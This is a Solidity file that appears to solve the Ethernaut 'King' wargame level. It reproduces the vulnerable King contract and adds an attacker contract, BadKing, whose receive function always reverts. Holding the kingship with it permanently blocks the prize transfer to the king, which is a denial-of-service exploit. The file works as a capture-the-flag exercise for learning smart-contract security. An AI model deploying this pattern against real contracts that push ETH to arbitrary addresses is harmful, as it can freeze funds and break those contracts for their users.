// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {
    address payable king;
    uint256 public prize;
    address payable public owner;

    constructor() public payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}

// SOL: All we have to do is take the kingship with a contract without a fallback method.

contract BadKing {

    function becomeKing(address payable _to) public payable {
        (bool success,) = _to.call{value:msg.value}(new bytes(0));
        require(success, "ETH_TRANSFER_FAILED");
    }

    receive() external payable {
        revert("You are not becoming the king");
    }
}
